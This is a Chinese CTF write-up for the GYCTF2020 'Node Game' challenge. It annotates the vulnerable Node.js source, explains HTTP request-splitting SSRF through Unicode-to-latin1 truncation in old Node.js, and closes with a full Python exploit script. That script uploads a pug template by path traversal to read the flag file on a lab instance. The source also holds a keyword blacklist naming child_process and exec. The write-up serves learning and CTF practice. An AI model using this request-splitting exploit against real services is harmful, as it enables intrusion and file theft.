---
title: '[GYCTF2020]Node Game'
date: 2024-10-11 19:13:02
tags: 
        - ssrf
        - nodejs
categories: 刷题笔记
---

### [GYCTF2020]Node Game(ssrf拆分攻击)

我们打开题目发现有两个页面，应该是源码，应该是上传页面

<!--more-->

***来自郭学姐写的注释***

```
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path'); // 处理文件路径
var http = require('http');
var pug = require(`pug`); // 模板渲染
var morgan = require('morgan'); // 日志
const multer = require('multer'); // 用于处理multipart/form-data类型的表单数据，实现上传功能；个人一般使用formidable实现上传
 
// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组
app.use(multer({dest: './dist'}).array('file'));
// 使用简化版日志
app.use(morgan('short'));
 
// 静态文件路由 express.static中间件用于提供静态文件服务。访问/uploads和/template路由时，将分别从项目目录下的/uploads和/template目录中提供文件。
app.use("/uploads", express.static(path.join(__dirname, '/uploads')))
app.use("/template", express.static(path.join(__dirname, '/template')))
 
app.get('/', function (req, res) {
    // GET方法获取action参数
    var action = req.query.action ? req.query.action : "index";
    // action中不能包含/  \\
    if (action.includes("/") || action.includes("\\")) {
        res.send("Errrrr, You have been Blocked");
    }
    // 将/template/[action].pug渲染成html输出到根目录
    file = path.join(__dirname + '/template/' + action + '.pug');
    var html = pug.renderFile(file);
    res.send(html);//访问路径为file的文件//将 html 变量的内容作为 HTTP 响应的主体发送给请求方。
});
 
app.post('/file_upload', function (req, res) {
    var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接
    var obj = {msg: '',}//创建了一个包含msg属性的对象，初始值为空字符串
    // 请求必须来自localhost
    if (!ip.includes('127.0.0.1')) {
        obj.msg = "only admin's ip can use it"
        res.send(JSON.stringify(obj));//JSON.stringify()方法用于将JavaScript值转换为JSON字符
        return
    }
    // node.js读取文件 fs.readFile(),一种格式fs.readFile(filePath,{encoding:"utf-8"}, function (err, fr){
    fs.readFile(req.files[0].path, function (err, data) {
        // 判断上传文件合法
        if (err) {
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        } else {
            // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面
            var file_path = '/uploads/' + req.files[0].mimetype + "/";
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if (!fs.existsSync(__dirname + file_path)) {
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file, data)
                obj = {msg: 'upload success', filename: file_path + file_name}
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));
        }
    })
})
 
// 查看题目源码
app.get('/source', function (req, res) {
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});
 
// ssrf核心 
app.get('/core', function (req, res) {
    var q = req.query.q;//用于获取HTTP请求中查询参数的方式 例：?q=nodejs返回nodejs
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q
        console.log(url)//变量 url 的值输出到控制台
        // 对url字符进行waf
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("error occurs!");
        } else {
            try {
                // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过
                http.get(url, function (resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function (err) {
                        if (err.code === "ECONNRESET") {
                            console.log("Timeout occurs");
                        }
                    });
                    // 返回结果输出到/core
                    resp.on('data', function (chunk) {
                        try {
                            resps = chunk.toString();
                            res.send(resps);
                        } catch (e) {
                            res.send(e.message);
                        }
                    }).on('error', (e) => {
                        res.send(e.message);//e=error
                    });
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})
 
// 关键字waf 利用字符串拼接实现绕过
function blacklist(url) {
    var evilwords = ["global", "process", "mainModule", "require", "root", "child_process", "exec", "\"", "'", "!"];
    var arrayLen = evilwords.length;
 
    for (var i = 0; i < arrayLen; i++) {
        const trigger = url.includes(evilwords[i]);//includes() 是 JavaScript 字符串的方法，用于判断该字符串是否包含指定的子字符串。它返回一个布尔值：如果包含返回 true，否则返回 false。
        if (trigger === true) {
            return true
        }
    }
}
 //启动一个监听在8081端口的Express.js服务器
var server = app.listen(8081, function () {
    var host = server.address().address
    var port = server.address().port
    console.log("Example app listening at http://%s:%s", host, port)
})
```

我们来分析源码

```
app.get('/', function (req, res) {
    var action = req.query.action ? req.query.action : "index";

    if (action.includes("/") || action.includes("\\")) {
        return res.send("Errrrr, You have been Blocked");
    }

    var file = path.join(__dirname, '/template/', action + '.pug');
    var html = pug.renderFile(file);
    res.send(html);
});

```

首先是个路由，它过滤了/和\\，并且会将`/template/"action".pug`这一文件进行pug渲染

```
app.post('/file_upload', function (req, res) {
    var ip = req.connection.remoteAddress;
    var obj = { msg: '' };

    if (!ip.includes('127.0.0.1')) {
        obj.msg = "only admin's ip can use it";
        return res.send(JSON.stringify(obj));
    }

    fs.readFile(req.files[0].path, function (err, data) {
        if (err) {
            obj.msg = 'upload failed';
            return res.send(JSON.stringify(obj));
        }

        var file_path = '/uploads/' + req.files[0].mimetype + "/";
        var file_name = req.files[0].originalname;
        var dir_file = path.join(__dirname, file_path, file_name);

        if (!fs.existsSync(path.join(__dirname, file_path))) {
            try {
                fs.mkdirSync(path.join(__dirname, file_path));
            } catch (error) {
                obj.msg = "file type error";
                return res.send(JSON.stringify(obj));
            }
        }

        try {
            fs.writeFileSync(dir_file, data);
            obj = { msg: 'upload success', filename: file_path + file_name };
        } catch (error) {
            obj.msg = 'upload failed';
        }

        res.send(JSON.stringify(obj));
    });
});

```

然后是个文件上传的路由，它允许post请求，并限制了ip只能由127.0.0.1访问，同时var ip = req.connection.remoteAddress;说明ip是不能通过请求头来伪造的。

然后会将路径根据mimetype进行拼接：

```
/uploads/' + req.files[0].mimetype +'/';
```

结合上面的对/template/下的pug文件进行渲染，可以想到使用`../`,如：
`uploads/../template/+filename`这样就相当于传了一个文件到template下

但前提是要先进行ssrf

```
app.get('/core', function(req, res) {
    var q = req.query.q;
    var resp = "";
    if (q) {
        var url = 'http://localhost:8081/source?' + q
        console.log(url)
        var trigger = blacklist(url);
        if (trigger === true) {
            res.send("<p>error occurs!</p>");
        } else {
            try {
                http.get(url, function(resp) {
                    resp.setEncoding('utf8');
                    resp.on('error', function(err) {
                    if (err.code === "ECONNRESET") {
                     console.log("Timeout occurs");
                     return;
                    }
                   });

                    resp.on('data', function(chunk) {
                        try {
                         resps = chunk.toString();
                         res.send(resps);
                        }catch (e) {
                           res.send(e.message);
                        }
 
                    }).on('error', (e) => {
                         res.send(e.message);});
                });
            } catch (error) {
                console.log(error);
            }
        }
    } else {
        res.send("search param 'q' missing!");
    }
})

```

然后这里是接受了一个参数q，并且对本地进行了请求，url = ‘http://localhost:8081/source?’ + q，这里就是ssrf的攻击点

**通过拆分攻击实现的ssrf攻击**

1.对/core路由发起切分攻击，请求/core的同时还向source路由发出上传文件

的请求

2.由于路由是先读取/temple/目录下的pug文件，再将其渲染到当前页面，因此应该上传包含命令执行的pug文件；文件虽然默认上传至/upload/目录下，但可以通过目录穿越将文件上传到/template目录

3.访问上传到/template目录下包含命令执行的pug文件

[漏洞：通过拆分请求实现的SSRF攻击](https://xz.aliyun.com/t/2894)

假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：

```
GET /private-api?q=<user-input-here> HTTP/1.1
Authorization: server-secret-key

```

如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：

```
“x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n”
```

在发出请求时，服务器可能会直接将其写入路径，如下：

```
GET /private-api?q=x HTTP/1.1

DELETE /private-api
Authorization: server-secret-key

```

**说到底就是\r\n成功生效**

接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE

好的HTTP库通通常包含阻止这一行为的措施，Node.js也不例外：如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码：

```
http.get('http://example.com/\r\n/test').output
[ 'GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' ]

```

但是，上述的处理unicode字符错误意味着可以规避这些措施。考虑如下的url，其中包含一些带变音符号的unicode字符

```
'http://example.com/\u{010D}\u{010A}/test'
http://example.com/čĊ/test

```

当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符：

```
http.get('http://example.com/\u010D\u010A/test').output
[ 'GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n' ]

```

但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\r”和“\n”：

```
Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString()
'http://example.com/\r\n/test'

```

Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符

说白了，上面这段的意思就是我们可以利用一些特殊字符，它们在URL请求时不会被转义处理，但是当它到了js引擎时，由于其默认用的是latin1，因此可以将我们用的特殊字符转义得到我们需要的字符，从而达到ssrf的目的

原理了解完后，接下来利用那个上传页面上传一个文件，burp suite 抓下包

![image-20241011213825366](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410112138569.png)

然后下面就是如何构造http走私了，下面这个是rce的脚本，由于有黑名单验证，可以拼接绕过，然后由于pug模板引擎，需要在前面加上-，来表示开始一段代码
		我们到网上找个脚本

```
import urllib.parse
import requests

payload = ''' HTTP/1.1
Host: x
Connection: keep-alive

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Length: {}
cache-control: no-cache
Host: 127.0.0.1
Connection: keep-alive 

{}'''
body='''------WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Disposition: form-data; name="file"; filename="lmonstergg.pug"
Content-Type: ../template

doctype html
html
  head
    style
      include ../../../../../../../flag.txt
------WebKitFormBoundaryO9LPoNAg9lWRUItA--
'''
more='''

GET /flag HTTP/1.1
Host: x
Connection: close
x:'''

//`Host: x` 中的 `x` 只是一个占位符，实际应该被替换为目标服务器的域名或 IP 地址，用来指明请求的目标主机。

payload = payload.format(len(body)+10,body)+more
payload = payload.replace("\n", "\r\n")
payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
print(payload)


session = requests.Session()
session.trust_env = False
session.get('http://7f25cffa-eee3-46c0-8d88-627085f1cef8.node5.buuoj.cn:81/core?q=' + urllib.parse.quote(payload))
response = session.get('http://7f25cffa-eee3-46c0-8d88-627085f1cef8.node5.buuoj.cn:81/?action=lmonstergg')
print(response.text)
```

运行，得到flag

![image-20241011214055584](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410112140624.png)
